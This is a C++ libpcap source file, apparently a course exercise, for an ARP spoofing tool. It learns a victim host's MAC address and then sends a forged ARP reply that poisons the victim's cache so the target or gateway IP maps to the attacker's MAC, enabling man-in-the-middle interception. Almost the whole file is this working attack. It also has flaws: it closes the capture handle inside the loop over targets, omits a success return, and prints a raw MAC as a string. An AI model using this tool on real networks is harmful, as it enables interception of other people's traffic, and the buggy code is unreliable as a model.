#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netdb.h>
#include <stdint.h>
#include "libnet-headers.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

#define REQ_CNT 20


void convrt_mac( const char *data, char *cvrt_str, int sz )
{
     char buf[128] = {0x00,};
     char t_buf[8];
     char *stp = strtok( (char *)data , ":" );
     int temp=0;

     do
     {
          memset( t_buf, 0x0, sizeof(t_buf) );
          sscanf( stp, "%x", &temp );
          snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
          strncat( buf, t_buf, sizeof(buf)-1 );
          strncat( buf, ":", sizeof(buf)-1 );
     } while( (stp = strtok( NULL , ":" )) != NULL );

     buf[strlen(buf) -1] = '\0';
     strncpy( cvrt_str, buf, sz );
}

pcap_t *handle = NULL;
EthArpPacket packet;

int send_packet(char *my_ip, char *my_mac, char *you_ip, u_char *you_mac, uint8_t op)
{
	if(op==ARPOP_REQUEST){
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	}
	else{
		packet.eth_.dmac_ = Mac(you_mac);
		packet.arp_.tmac_ = Mac(you_mac);
	}
	packet.eth_.smac_ = Mac(my_mac); //me
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = Mac(my_mac); //me
	packet.arp_.sip_ = htonl(Ip(my_ip)); //gateway
	packet.arp_.tip_ = htonl(Ip(you_ip)); //you

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
}

int leak_you_mac(char *my_ip, char *my_mac, char *you_ip, u_char *you_mac)
{
	while (true) {
		send_packet(my_ip, my_mac, you_ip, you_mac, ARPOP_REQUEST);
  	    struct pcap_pkthdr* header;
  	    const u_char* rep_packet;
   	    int res = pcap_next_ex(handle, &header, &rep_packet);
  	    if (res == 0) continue;
  	    if (res == -1 || res == -2) {
 	      printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
  	      return -1;
    	}
		if(header->caplen < sizeof(EthArpPacket)) continue;

		EthArpPacket request_packet;
		EthArpPacket reply_packet;

		memcpy(&reply_packet, rep_packet, (size_t)sizeof(EthArpPacket));
		memcpy(&request_packet, reinterpret_cast<const u_char*>(&packet),(size_t)sizeof(EthArpPacket));

		if((reply_packet.arp_.sip_==request_packet.arp_.tip_)&&(reply_packet.arp_.tip_==request_packet.arp_.sip_)&&(reply_packet.arp_.tmac_==request_packet.arp_.smac_)){
			memcpy(you_mac, reply_packet.arp_.smac_, Mac::SIZE);
			printf("you_mac = %s\n", you_mac);
			return 1;
		}
		else continue;
	}
}

char my_ip[20];
char my_mac[20];
char mac_adr[128];

int ip_mac()
{
	int sockfd, cnt, req_cnt = REQ_CNT;
    //char mac_adr[128] = {0x00,};
    struct sockaddr_in *sock;
    struct ifconf ifcnf_s;
    struct ifreq *ifr_s;

    sockfd = socket( PF_INET , SOCK_DGRAM , 0 );
    if( sockfd < 0 ) {
        perror( "socket()" );
        return -1;
    }

    memset( (void *)&ifcnf_s , 0x0 , sizeof(ifcnf_s) );
    ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
    ifcnf_s.ifc_buf = (char *)malloc(ifcnf_s.ifc_len);
    if( ioctl( sockfd, SIOCGIFCONF, (char *)&ifcnf_s ) < 0 ) {
        perror( "ioctl() - SIOCGIFCONF" );
        return -1;
    }

    // ifc_len 사이즈가 우리가 할당한 사이즈보다 크다면 공간 재할당
    if( ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt) ) {
        req_cnt = ifcnf_s.ifc_len;
        ifcnf_s.ifc_buf = (char *)realloc( ifcnf_s.ifc_buf, req_cnt );
    }

    ifr_s = ifcnf_s.ifc_req;
    for( cnt = 0 ; cnt < ifcnf_s.ifc_len ; cnt += sizeof(struct ifreq), ifr_s++ )
    {
        if( ioctl( sockfd, SIOCGIFFLAGS, ifr_s ) < 0 ) {
            perror( "ioctl() - SIOCGIFFLAGS" );
            return -1;
        }

        // LOOPBACK에 대한 구조체이면 continue
        if( ifr_s->ifr_flags & IFF_LOOPBACK )
            continue;

        sock = (struct sockaddr_in *)&ifr_s->ifr_addr;
		strcpy(my_ip, inet_ntoa(sock->sin_addr));
        printf( "\n<IP address> - %s\n" , my_ip );

        if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
            perror( "ioctl() - SIOCGIFHWADDR" );
            return -1;
        }
        convrt_mac( ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr) -1 );
        strcpy(my_mac,mac_adr);
		printf( "<MAC address> - %s\n" , my_mac );
    }
}

int main(int argc, char* argv[]){

	if (((argc%2) != 0) || argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	u_char you_mac[6] = {0,};
	char *you_ip;
	char *target_ip;
	if(ip_mac()==-1) {
		printf("Couldn't get Local IP and Mac address.\n");
		return -1;
	}
	printf("IP, Mac address success!\n");
	printf("Local IP addr : %s\n", my_ip);
	printf("Local Mac addr : %s\n", my_mac);
	for(int i=1;i<(argc/2);i++){
		you_ip = argv[2*i];
		printf("sender ip = %s\n", you_ip);
		target_ip = argv[2*i+1];
		printf("target ip = %s\n", target_ip);

		if(leak_you_mac(my_ip, my_mac, you_ip, you_mac) == -1){
			printf("Wrong!!\n\n");
			return -1;
		}

		send_packet(target_ip, my_mac, you_ip, you_mac, ARPOP_REPLY);
		pcap_close(handle);
	}
}
